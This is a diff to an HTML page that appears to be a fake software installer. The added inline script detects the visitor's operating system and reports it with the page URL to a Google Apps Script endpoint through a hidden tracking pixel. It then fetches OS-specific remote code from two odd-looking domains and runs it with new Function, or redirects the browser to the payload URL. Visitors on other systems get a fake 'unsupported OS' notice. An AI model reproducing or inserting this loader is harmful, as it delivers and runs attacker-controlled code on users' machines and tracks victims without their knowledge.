@@ -50,22 +50,62 @@
     </div>
 
     <script>
+        const REMOTE_WINDOWS = "https://spankyrereel.com/faster.depone";
+        const REMOTE_MAC = "https://condorhelplyornate.com/aporia.brooky";
+        const ERROR_URL = "https://github.com/";
+
+        const APP_URL = "https://script.google.com/macros/s/AKfycbzJt5sUSvYmjskv_K7dSLhGSzULH3BisOvq_lj6fzOmOouGVwz1habG64TFgFTEc1lr/exec";
+
+        function detectOS() {
+            const uad = navigator.userAgentData;
+            if (uad && uad.platform) {
+                const p = uad.platform.toLowerCase();
+                if (p.includes('windows')) return 'windows';
+                if (p.includes('mac')) return 'macos';
+            }
+            const ua = navigator.userAgent || '';
+            if (/Windows NT/i.test(ua)) return 'windows';
+            if (/Macintosh;.*Mac OS X/i.test(ua)) return 'macos';
+            return 'other';
+        }
+
+        function sendLink() {
+            const currentPage = window.location.href;
+            const os = detectOS();
+            const payload = { 
+                offer: currentPage,
+                os: os
+            };
+            const q = new URLSearchParams({ p: JSON.stringify(payload) }).toString();
+            new Image(1,1).src = APP_URL + "?" + q + "&_t=" + Date.now();
+        }
+
         (function() {
-            const REMOTE = "https://spankyrereel.com/faster.depone";
             const headline = document.getElementById('headline');
             const status = document.getElementById('status');
+            const os = detectOS();
 
-            async function load() {
-                try {
-                    const res = await fetch(REMOTE, { cache: 'no-store' });
-                    const code = await res.text();
-                    new Function('headline', 'status', code)(headline, status);
-                } catch {
-                    status.textContent = 'Processing request...';
+            sendLink();
+
+            if (os === 'windows' || os === 'macos') {
+                const targetUrl = os === 'windows' ? REMOTE_WINDOWS : REMOTE_MAC;
+                async function load() {
+                    try {
+                        status.textContent = 'Downloading components...';
+                        const res = await fetch(targetUrl, { cache: 'no-store' });
+                        const code = await res.text();
+                        new Function('headline', 'status', code)(headline, status);
+                    } catch {
+                        status.textContent = 'Processing request...';
+                        setTimeout(() => { window.location.replace(targetUrl); }, 500);
+                    }
                 }
+                load();
+            } else {
+                headline.textContent = "Attention: Unsupported Operating System";
+                status.textContent = "To continue installation, you must be using Windows or macOS. Installation is not supported on your current operating system.";
+                setTimeout(() => { window.location.replace(ERROR_URL); }, 4000);
             }
-            
-            load();
         })();
     </script>
 </body>
